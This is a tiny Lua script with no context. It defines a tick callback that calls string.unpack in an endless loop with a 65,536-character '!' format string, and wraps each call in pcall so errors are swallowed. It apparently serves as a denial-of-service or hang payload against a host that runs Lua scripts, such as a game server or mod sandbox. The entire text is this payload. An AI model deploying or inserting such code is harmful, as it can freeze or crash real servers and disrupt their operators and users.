local su = string.unpack local f = string.rep("!", 65536) function on_tick() while true do pcall(su, f, "") end end
